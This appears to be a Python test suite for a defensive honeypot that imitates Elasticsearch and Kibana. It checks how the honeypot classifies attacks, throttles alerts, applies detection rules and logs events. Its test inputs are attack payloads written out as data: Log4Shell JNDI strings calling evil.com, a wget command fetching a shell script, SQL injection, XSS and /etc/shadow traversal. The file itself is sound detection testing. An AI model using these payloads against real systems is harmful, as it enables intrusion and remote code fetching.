"""
Delilah Honeypot — Automated Test Suite
Runs against a live honeypot instance or in isolation using unit tests.
"""

import unittest
import sqlite3
import json
import sys
import os
import time

# ── Allow importing from project root ──
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ══════════════════════════════════════════════════════════
#  1. UNIT TESTS — Attack Classifier
# ══════════════════════════════════════════════════════════
class TestClassifyAttack(unittest.TestCase):
    """Tests for the classify_attack() function in honeypot.py"""

    def setUp(self):
        from honeypot import classify_attack
        self.classify = classify_attack

    # ── Scanner detection ──
    def test_scanner_shodan(self):
        result = self.classify("/", "shodan/1.0", "")
        self.assertEqual(result, "Automated Scanner Detected")

    def test_scanner_sqlmap(self):
        result = self.classify("/", "sqlmap/1.6.4", "")
        self.assertEqual(result, "Automated Scanner Detected")

    def test_scanner_nmap(self):
        result = self.classify("/", "nmap scripting engine", "")
        self.assertEqual(result, "Automated Scanner Detected")

    def test_scanner_nikto(self):
        result = self.classify("/", "nikto/2.1.6", "")
        self.assertEqual(result, "Automated Scanner Detected")

    def test_scanner_nuclei(self):
        result = self.classify("/", "nuclei/2.9.0", "")
        self.assertEqual(result, "Automated Scanner Detected")

    # ── CVE exploit probes ──
    def test_cve_log4shell(self):
        result = self.classify("/?x=${jndi:ldap://evil.com/a}", "Mozilla/5.0", "")
        self.assertEqual(result, "CVE Exploit Probe")

    def test_cve_shellshock(self):
        result = self.classify("/?x=() { :;};", "Mozilla/5.0", "")
        self.assertEqual(result, "CVE Exploit Probe")

    def test_cve_log4shell_in_post(self):
        result = self.classify("/", "Mozilla/5.0", "${jndi:ldap://attacker.com}")
        self.assertEqual(result, "CVE Exploit Probe")

    # ── SQL Injection ──
    def test_sqli_basic(self):
        result = self.classify("/_search?q=1' OR 1=1--", "Mozilla/5.0", "")
        self.assertEqual(result, "SQL Injection Attempt")

    def test_sqli_union(self):
        result = self.classify("/?q=union select * from users", "Mozilla/5.0", "")
        self.assertEqual(result, "SQL Injection Attempt")

    def test_sqli_drop(self):
        result = self.classify("/?q=drop table users", "Mozilla/5.0", "")
        self.assertEqual(result, "SQL Injection Attempt")

    def test_sqli_in_post_body(self):
        result = self.classify("/", "Mozilla/5.0", "username=admin' OR '1'='1")
        self.assertEqual(result, "SQL Injection Attempt")

    # ── XSS ──
    def test_xss_script_tag(self):
        result = self.classify("/?x=<script>alert(1)</script>", "Mozilla/5.0", "")
        self.assertEqual(result, "XSS Attempt")

    def test_xss_javascript_protocol(self):
        result = self.classify("/?url=javascript:alert(1)", "Mozilla/5.0", "")
        self.assertEqual(result, "XSS Attempt")

    def test_xss_onerror(self):
        result = self.classify("/?x=<img onerror=alert(1)>", "Mozilla/5.0", "")
        self.assertEqual(result, "XSS Attempt")

    # ── Path Traversal / LFI ──
    def test_lfi_etc_passwd(self):
        result = self.classify("/?file=/etc/passwd", "Mozilla/5.0", "")
        self.assertEqual(result, "Path Traversal / LFI Attempt")

    def test_lfi_traversal(self):
        result = self.classify("/?f=../../../../etc/shadow", "Mozilla/5.0", "")
        self.assertEqual(result, "Path Traversal / LFI Attempt")

    def test_lfi_windows(self):
        result = self.classify("/?f=boot.ini", "Mozilla/5.0", "")
        self.assertEqual(result, "Path Traversal / LFI Attempt")

    # ── Command Injection ──
    def test_cmd_wget(self):
        result = self.classify("/?cmd=wget http://evil.com/shell.sh", "Mozilla/5.0", "")
        self.assertEqual(result, "Command Injection Attempt")

    def test_cmd_whoami(self):
        result = self.classify("/?x=;whoami", "Mozilla/5.0", "")
        self.assertEqual(result, "Command Injection Attempt")

    def test_cmd_powershell(self):
        result = self.classify("/?cmd=powershell -enc abc", "Mozilla/5.0", "")
        self.assertEqual(result, "Command Injection Attempt")

    # ── Elasticsearch Recon ──
    def test_recon_search(self):
        result = self.classify("/_search", "Mozilla/5.0", "")
        self.assertEqual(result, "Reconnaissance Attack")

    def test_recon_cat(self):
        result = self.classify("/_cat/indices", "Mozilla/5.0", "")
        self.assertEqual(result, "Reconnaissance Attack")

    def test_recon_cluster(self):
        result = self.classify("/_cluster/health", "Mozilla/5.0", "")
        self.assertEqual(result, "Reconnaissance Attack")

    # ── Admin probes ──
    def test_admin_wp(self):
        result = self.classify("/wp-admin", "Mozilla/5.0", "")
        self.assertEqual(result, "Admin Panel Probe")

    def test_admin_env(self):
        result = self.classify("/.env", "Mozilla/5.0", "")
        self.assertEqual(result, "Admin Panel Probe")

    def test_admin_phpmyadmin(self):
        result = self.classify("/phpmyadmin", "Mozilla/5.0", "")
        self.assertEqual(result, "Admin Panel Probe")

    # ── Default fallback ──
    def test_suspicious_fallback(self):
        result = self.classify("/some/random/path", "Mozilla/5.0", "")
        self.assertEqual(result, "Suspicious Request")

    # ── Priority ordering (scanner should beat SQLi) ──
    def test_priority_scanner_over_sqli(self):
        result = self.classify("/?q=1' OR 1=1", "sqlmap/1.6", "")
        self.assertEqual(result, "Automated Scanner Detected",
                         "Scanner detection should take priority over SQLi")

    # ── Priority (CVE over command injection) ──
    def test_priority_cve_over_command(self):
        result = self.classify("/?x=${jndi:ldap://x.com}&cmd=wget", "Mozilla/5.0", "")
        self.assertEqual(result, "CVE Exploit Probe",
                         "CVE probe should take priority over command injection")


# ══════════════════════════════════════════════════════════
#  2. UNIT TESTS — Alert Throttle
# ══════════════════════════════════════════════════════════
class TestAlertThrottle(unittest.TestCase):
    def setUp(self):
        import honeypot
        honeypot._alert_last_sent.clear()
        self.should_send = honeypot.should_send_alert
        self.state       = honeypot._alert_last_sent
        import os
        os.environ["ALERT_COOLDOWN_SECONDS"] = "2"
        honeypot.ALERT_COOLDOWN = 2

    def test_first_alert_always_sends(self):
        self.assertTrue(self.should_send("1.2.3.4"))

    def test_second_alert_blocked(self):
        self.should_send("1.2.3.5")
        self.assertFalse(self.should_send("1.2.3.5"),
                         "Second immediate alert should be blocked by cooldown")

    def test_different_ips_independent(self):
        self.should_send("10.0.0.1")
        self.assertTrue(self.should_send("10.0.0.2"),
                        "Different IPs should have independent cooldowns")

    def test_alert_after_cooldown(self):
        self.should_send("5.5.5.5")
        time.sleep(2.1)
        self.assertTrue(self.should_send("5.5.5.5"),
                        "Alert should be allowed after cooldown expires")


# ══════════════════════════════════════════════════════════
#  3. UNIT TESTS — Detection Rule Engine
# ══════════════════════════════════════════════════════════
class TestRuleEngine(unittest.TestCase):
    def setUp(self):
        import honeypot
        honeypot._ip_request_log.clear()
        honeypot._ip_endpoint_log.clear()
        honeypot._ip_attack_types.clear()
        self.evaluate = honeypot.evaluate_rules

        # Write a minimal test rules file
        test_rules = [
            {
                "id": 99,
                "name": "Test Rapid Fire",
                "description": "Flag IP hitting 3+ times in 10s",
                "condition": "request_count",
                "value": "",
                "threshold": 3,
                "window_seconds": 10,
                "action": "flag",
                "severity": "MEDIUM",
                "enabled": True
            }
        ]
        with open("rules.json", "w") as f:
            json.dump(test_rules, f)

    def test_rule_not_triggered_below_threshold(self):
        self.evaluate("9.9.9.1", "Recon", "/")
        self.evaluate("9.9.9.1", "Recon", "/")
        triggered = self.evaluate("9.9.9.1", "Recon", "/")
        # Triggered on 3rd hit — check it's the right rule
        names = [r["name"] for r in triggered]
        self.assertIn("Test Rapid Fire", names)

    def test_rule_not_triggered_for_fresh_ip(self):
        triggered = self.evaluate("8.8.8.8", "Recon", "/")
        self.assertEqual(triggered, [], "Single request should not trigger rapid fire rule")

    def test_disabled_rule_not_triggered(self):
        import honeypot
        test_rules = [{
            "id": 98, "name": "Disabled Rule", "description": "Should never fire",
            "condition": "request_count", "value": "", "threshold": 1,
            "window_seconds": 60, "action": "flag", "severity": "LOW", "enabled": False
        }]
        with open("rules.json", "w") as f:
            json.dump(test_rules, f)
        honeypot._ip_request_log.clear()
        triggered = self.evaluate("7.7.7.7", "Recon", "/")
        self.assertEqual(triggered, [], "Disabled rule should never trigger")


# ══════════════════════════════════════════════════════════
#  4. INTEGRATION TESTS — Database Schema
# ══════════════════════════════════════════════════════════
class TestDatabaseSchema(unittest.TestCase):
    """Verify the database tables and columns are created correctly."""

    def setUp(self):
        self.db = sqlite3.connect(":memory:")
        cursor = self.db.cursor()
        # Replicate schema from honeypot.py
        cursor.execute('''CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, source_ip TEXT, event_type TEXT,
            request_uri TEXT, method TEXT DEFAULT 'GET', post_body TEXT,
            user_agent TEXT, country TEXT, region TEXT, city TEXT,
            isp TEXT, org TEXT, lat REAL, lon REAL,
            abuse_score INTEGER DEFAULT NULL,
            rule_flags TEXT DEFAULT NULL
        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS harvested_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, source_ip TEXT, username TEXT, password TEXT,
            endpoint TEXT, user_agent TEXT, country TEXT, city TEXT
        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS flagged_ips (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, source_ip TEXT, rule_name TEXT,
            severity TEXT, details TEXT
        )''')
        self.db.commit()
        self.cursor = cursor

    def test_events_table_exists(self):
        self.cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='events'")
        self.assertIsNotNone(self.cursor.fetchone())

    def test_credentials_table_exists(self):
        self.cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='harvested_credentials'")
        self.assertIsNotNone(self.cursor.fetchone())

    def test_flagged_ips_table_exists(self):
        self.cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='flagged_ips'")
        self.assertIsNotNone(self.cursor.fetchone())

    def test_events_has_abuse_score_column(self):
        self.cursor.execute("PRAGMA table_info(events)")
        cols = [row[1] for row in self.cursor.fetchall()]
        self.assertIn("abuse_score", cols)

    def test_events_has_rule_flags_column(self):
        self.cursor.execute("PRAGMA table_info(events)")
        cols = [row[1] for row in self.cursor.fetchall()]
        self.assertIn("rule_flags", cols)

    def test_events_has_method_column(self):
        self.cursor.execute("PRAGMA table_info(events)")
        cols = [row[1] for row in self.cursor.fetchall()]
        self.assertIn("method", cols)

    def test_insert_event(self):
        self.cursor.execute("""
            INSERT INTO events (timestamp, source_ip, event_type, request_uri, method, user_agent)
            VALUES (?, ?, ?, ?, ?, ?)
        """, ("2026-01-01T00:00:00", "1.2.3.4", "SQL Injection Attempt",
              "/_search?q=1' OR 1=1", "GET", "sqlmap/1.6"))
        self.db.commit()
        self.cursor.execute("SELECT COUNT(*) FROM events")
        self.assertEqual(self.cursor.fetchone()[0], 1)

    def test_insert_credential(self):
        self.cursor.execute("""
            INSERT INTO harvested_credentials
            (timestamp, source_ip, username, password, endpoint, user_agent)
            VALUES (?, ?, ?, ?, ?, ?)
        """, ("2026-01-01T00:00:00", "1.2.3.4", "admin", "password123", "/kibana/login", "Mozilla/5.0"))
        self.db.commit()
        self.cursor.execute("SELECT COUNT(*) FROM harvested_credentials")
        self.assertEqual(self.cursor.fetchone()[0], 1)

    def tearDown(self):
        self.db.close()


# ══════════════════════════════════════════════════════════
#  5. INTEGRATION TESTS — HTTP Endpoints (live server)
# ══════════════════════════════════════════════════════════
class TestLiveEndpoints(unittest.TestCase):
    """
    These tests run against a live honeypot.
    Skip automatically if server is not running.
    """

    BASE = "http://localhost:9200"

    @classmethod
    def setUpClass(cls):
        import urllib.request
        try:
            urllib.request.urlopen(cls.BASE, timeout=2)
            cls.server_up = True
        except Exception:
            cls.server_up = False

    def skip_if_down(self):
        if not self.server_up:
            self.skipTest("Honeypot not running on localhost:9200")

    def test_root_returns_json(self):
        self.skip_if_down()
        import urllib.request
        r = urllib.request.urlopen(self.BASE)
        data = json.loads(r.read())
        self.assertIn("name", data)
        self.assertEqual(data["version"]["number"], "7.10.0")

    def test_root_has_elasticsearch_name(self):
        self.skip_if_down()
        import urllib.request
        r = urllib.request.urlopen(self.BASE)
        data = json.loads(r.read())
        self.assertEqual(data["name"], "Elasticsearch-Node")

    def test_kibana_login_returns_html(self):
        self.skip_if_down()
        import urllib.request
        r = urllib.request.urlopen(f"{self.BASE}/kibana/login")
        content = r.read().decode()
        self.assertIn("Kibana", content)
        self.assertIn("<form", content)

    def test_attack_endpoint_returns_json(self):
        self.skip_if_down()
        import urllib.request
        r = urllib.request.urlopen(f"{self.BASE}/_search")
        data = json.loads(r.read())
        self.assertIn("status", data)
        self.assertIn("type", data)

    def test_monitor_dashboard_up(self):
        self.skip_if_down()
        import urllib.request
        try:
            r = urllib.request.urlopen("http://localhost:8080", timeout=2)
            self.assertEqual(r.status, 200)
        except Exception:
            self.skipTest("Monitor not running on localhost:8080")

    def test_monitor_stats_endpoint(self):
        self.skip_if_down()
        import urllib.request
        try:
            r = urllib.request.urlopen("http://localhost:8080/stats", timeout=2)
            data = json.loads(r.read())
            self.assertIn("total_events", data)
            self.assertIn("total_attacks", data)
            self.assertIn("geo_points", data)
        except Exception:
            self.skipTest("Monitor /stats not reachable")


# ══════════════════════════════════════════════════════════
#  RUNNER
# ══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 60)
    print("  🍯 Delilah Honeypot — Test Suite")
    print("=" * 60)
    loader  = unittest.TestLoader()
    suite   = unittest.TestSuite()
    suite.addTests(loader.loadTestsFromTestCase(TestClassifyAttack))
    suite.addTests(loader.loadTestsFromTestCase(TestAlertThrottle))
    suite.addTests(loader.loadTestsFromTestCase(TestRuleEngine))
    suite.addTests(loader.loadTestsFromTestCase(TestDatabaseSchema))
    suite.addTests(loader.loadTestsFromTestCase(TestLiveEndpoints))
    runner  = unittest.TextTestRunner(verbosity=2)
    result  = runner.run(suite)
    sys.exit(0 if result.wasSuccessful() else 1)
